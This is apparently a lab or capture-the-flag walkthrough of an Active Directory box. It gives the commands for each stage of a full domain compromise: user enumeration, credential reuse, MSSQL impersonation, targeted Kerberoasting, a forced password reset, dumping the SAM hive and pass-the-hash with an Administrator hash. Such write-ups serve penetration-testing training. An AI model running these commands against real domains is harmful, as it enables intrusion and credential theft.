#box

*Created: 2/17/2026*

### Step 1

**Tags:** #kerberos #Active-Directory #kerbrute #User-Enumeration #Weak-Credentials #nxc

**Command:**
```bash
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.220.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

*Port: 88*

> 
> The target machine is already the dc as it's shown in the nmap search and since it's implicitly returned by the fact that kerberos is running on it. We opt to use kerbrute, enumerating the common users of the domain and find out that the `info@hokkaido-aerospace.com` has an easy credential repetition, returning a free user named `info:info`

---

### Step 2

**Tags:** #SMB #Credentials-Leak #bruteforce

**Command:**
```bash
smbclient -U 'info'%'info' //192.168.220.40/NETLOGON -c 'prompt OFF;cd temp;get password_reset.txt'
```

*Port: 445 | 💎 GEM*

> 
> We opt to enumerate what's inside the SMB share discovering the presence of a file named `password_reset.txt` containing the password `Start123!`. When proceeding with a bruteforce we realize this is the password for the user `discovery`

---

### Step 3

**Tags:** #nxc #mssql #Credentials-Leak #impacket-mssqlclient

**Command:**
```bash
nxc mssql 192.168.220.40 -u users.txt -p 'Start123!'
```

*Port: 1433 | 💎 GEM*

> 
> After some more enumeration, we discover that this user can also access the MSSQL database on port 1433, once inside of it we discover the presence of a database named `hrappdb`. Inside of it, a `sysauth` tables leaks the credentials for the `hrappdb-service` user. To read the `hrappdb` database we'll have to impersonate the hrappdb-reader, an user that we can, in fact, impersonate. In the end, we'll obtain a new user namd `hrapp-service:Untimed$Runny`
> 
> ---

### Step 4

**Tags:** #Kerberoast #DACL #GenericWrite #hashcat #bloodhound

**Command:**
```bash
python3 targetedKerberoast -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny'
```

*Port: 88 | 💎 GEM*

> 
> Once got the `hrapp-service` user, we can now use bloodhound to give a look at the state of the art with what we've obtained so far. From the scan, we realize that owning `hrapp-service` user was useful because it has a `GenericWrite` DACL over the user `Hazel.Green`. We opt to gain control of it following bloodhound suggestions. Once obtained the tgs hash, we proceed to crack it obtaining: `Hazel.Green:haze1988`
> 
> We realize through bloodhound of this connection:
> 
> ![Image](attachments/Hokkaido-1.png)
> 
> We opt then to check what's the way to leverage the `GenericWrite` permission and realize the following comman is required to perform a targetedKerberoast over `Hazel.Green` through `hrapp-service`:
> 
> ```bash
> targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
> ```

---

### Step 5

**Tags:** #ForceChangePassword #net-rpc #rpcclient #RDP #xfreerdp

**Command:**
```bash
net rpc password "Molly.Smith" "Test123@" -U "hokkaido-aerospace.com"/"Hazel.Green"%"haze1988" -S "hokkaido-aerospace.com"
```

*Port: 135 | 💎 GEM*

> 
> Once obtained the user `Hazel.Green` we notice with Bloodhound that it has a `ForceChangePassword` DACL over the user `Molly.Smith` (which is also a Remote Desktop User). We proceed to change the password of the user `Molly.Smith` and finally proceed to authenticate to the machine through RDP
> 
> First of all, `Hazel.Green` belongs to the `TIER2-ADMINS` group as shown in the picture below:
> 
> ![Image](attachments/Hokkaido-2.png)
> 
> Second, that group has an Outbound Object Control over the user `Molly.Smith`, precisely a `ForceChangePassword` DACL. This permits us to change the password of that user with the `net rpc` command or through the `rpcclient` with the user `Hazel.Green`. The visual representation is shown below:
> 
> ![Image](attachments/Hokkaido-3.png)
> 
> The command is:
> 
> ```bash
> net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
> ```

---

### Step 6

**Tags:** #impacket-wmiexec #impacket #impacket-secretsdump #SAM

**Command:**
```bash
reg.exe save hklm\system C:\Temp\system.save
reg.exe save hklm\sam C:\Temp\sam.save
```

*💎 GEM*

> 
> Finally, once authenticated we realize we can extract the SAM archive of the machine, and later proceed to dump their secrets with impacket
> 
> We can eventually validate that it works also with:
> 
> ```bash
> nxc smb 192.168.220.40 -d 'hokkaido-aerospace.com' -u 'Administrator' -H 'd752482897d54e239376fddb2a2109e4' -x whoami
> ```

---

